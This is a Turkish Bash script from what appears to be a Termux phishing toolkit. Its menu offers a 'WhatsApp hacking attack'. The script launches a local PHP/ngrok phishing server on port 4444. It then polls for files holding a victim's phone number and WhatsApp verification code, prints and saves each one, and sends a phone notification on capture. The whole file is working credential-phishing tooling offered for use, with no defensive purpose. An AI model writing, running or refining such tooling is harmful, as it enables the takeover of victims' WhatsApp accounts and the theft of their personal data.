#!/bin/bash
clear
#http://www.network-science.de/ascii/
#cyberlarge
if [[ $1 == site ]];then
	echo
	echo
	echo
	printf "

	SİTE \e[31m>\e[32m http://www.network-science.de/ascii\e[0m

	YAZI FONTU \e[31m>\e[32m CYBERLARGE\e[0m

	ADJUSTMENT \e[31m>\e[32m LEFT \e[31m=\e[32m CENTER\e[0m
	"
	echo
	echo
	echo
	exit
fi

#################### GÜNLER ####################

pazartesi=$(date |grep -o Mon)
sali=$(date |grep -o Tue)
carsamba=$(date |grep -o Wed)
persembe=$(date |grep -o Thu)
cuma=$(date |grep -o Fri)
cumartesi=$(date |grep -o Sat)
pazar=$(date |grep -o Sun)

#################### GÜNLERE GÖRE RENKLER ####################

if [[ $pazartesi == Mon ]];then
	renk1='\e[0m'
	renk2='\e[32m'
elif [[ $sali == Tue ]];then
	renk1='\e[0m'
	renk2='\e[31m'
elif [[ $carsamba == Wed ]];then
	renk1='\e[0m'
	renk2='\e[33m'
elif [[ $persembe == Thu ]];then
	renk1='\e[0m'
	renk2='\e[34m'
elif [[ $cuma == Fri ]];then
	renk1='\e[0m'
	renk2='\e[36m'
elif [[ $cumartesi == Sat ]];then
	renk1='\e[31m'
	renk2='\e[34m'
elif [[ $pazar == Sun ]];then
	renk1='\e[33m'
	renk2='\e[34m'
fi

#################### BANNER ####################
printf "
$renk1
 _  _  _ _     _ _______ _______ _______ _______  _____   _____ 
 |  |  | |_____| |_____|    |    |______ |_____| |_____] |_____]
 |__|__| |     | |     |    |    ______| |     | |       |      

$renk2
  _____  _     _ _____ _______ _     _ _____ __   _  ______
 |_____] |_____|   |   |______ |_____|   |   | \  | |  ____
 |       |     | __|__ ______| |     | __|__ |  \_| |_____|

   
   \e[32mCoded By  \e[31m>\e[0m UmuT KaRa\e[32m
   TELEGRAM  \e[31m>\e[0m @termuxegitimm\e[32m
   İNSTAGRAM \e[31m>\e[0m @termuxegitim\e[32m
   GİTHUB    \e[31m>\e[0m termux-egitim\e[32m
   YOUTUBE   \e[31m>\e[0m termux-egitim

\e[0m

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mWHATSAPP HACKİNG ATTACK\e[97m

\e[31m[\e[97mK\e[31m]\e[97m ────────── \e[34mPHP & NGROK BAĞLANTIYI KES\e[97m

\e[31m[\e[97mG\e[31m]\e[97m ────────── \e[34mGERİ\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
dongu2() {
while :
do
	if [[ -a kod.txt ]];then
		echo
		echo
		echo
		printf "\e[32m$(cat kod.txt)\e[97m"
		echo
		echo
		echo
		cat kod.txt >> kaydedilen.txt
		rm kod.txt
		termux-notification -t WHATSAPP_PHİSHİNG -c "[✓] KOD GİRİLDİ"
		exit
	fi
done

}
dongu() {
while :
do
	if [[ -a numara.txt ]];then
		echo
		echo
		echo
		printf "\e[32m$(cat numara.txt)\e[97m"
		echo
		echo
		echo
		cat numara.txt >> kaydedilen.txt
		rm numara.txt
		termux-notification -t WHATSAPP_PHİSHİNG -c "[✓] NUMARA GİRİLDİ"
		dongu2
	fi
done
}
kapali() {
cat kaydedilen.txt > .sayi.txt
kontrol2=$(cat .sayi.txt |wc -l)
while :
do
	kontrol=$(cat kaydedilen.txt |wc -l)
	if [[ $kontrol != $kontrol2 ]];then
		echo
		echo
		echo
		printf "\e[32m$(cat kaydedilen.txt)\e[97m"
		echo
		echo
		echo
		termux-notification -t WHATSAPP_PHİSİNG -c "[✓] BİLGİ GİRİLDİ"
		exit
	fi
done
}
bulunan() {
if [[ -a kaydedilen.txt ]];then
	echo
	echo
	echo
	printf "\e[32m$(cat kaydedilen.txt)\e[97m"
	echo
	echo
	echo
	read -e -p $'\e[97mKAYDEDİLEN ESKİ DOSYA SİLİNSİN Mİ ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' sec
	if [[ $sec == e || $sec == E ]];then
		rm kaydedilen.txt
		echo
		echo
		echo
		printf "\e[32m[✓]\e[97m SİLME İŞLEMİ TAMAMLANDI"
		echo
		echo
		echo
		read -e -p $'\e[97mDEVAM ETMEK İSTİYOR MUSUN ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' secim
		if [[ $secim == e || $secim == E ]];then
			sleep 1
		elif [[ $secim == h || $secim == H ]];then
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m İŞLEM İPTAL EDİLDİ"
			echo
			echo
			echo
			sleep 2
			cd ..
			bash whatsapp_phishing.sh
			exit
		else
			echo
			echo
			echo
			printf "\e[31m[!]\e[97m HATALI SEÇİM"
			echo
			echo
			echo
			sleep 2 
			cd ..
			bash whatsapp_phishing.sh
			exit

		fi
	elif [[ $sec == h || $sec == H ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m SİLME İŞLEMİ İPTAL EDİLDİ"
		echo
		echo
		echo
		echo
		sleep 1
		bash index.sh -bg -p 4444
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
		echo
		echo
		echo
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		dongu
		
	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m HATALI SEÇİM"
		echo
		echo
		echo
		sleep 2
		cd ..
		bash whatsapp_phishing.sh
		exit
	fi
fi
}
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [[ $secim == 1 ]];then
	cd files
	bulunan
	bash index.sh -bg -p 4444
	echo
	echo
	echo
	printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
	echo
	echo
	echo
	printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
	echo
	echo
	echo
	dongu
elif [[ $secim == k || $secim == K ]];then
	bash pidkapat.sh
	sleep 2
	bash whatsapp_phishing.sh
	exit
elif [[ $secim == g || $secim == G || $secim == .. ]];then
	cd ../..
	bash phishing-attack.sh
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI\e[31m !!!\e[0m"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM\e[0m"
	echo
	echo
	echo
	sleep 2
	bash whatsapp_phishing.sh
fi
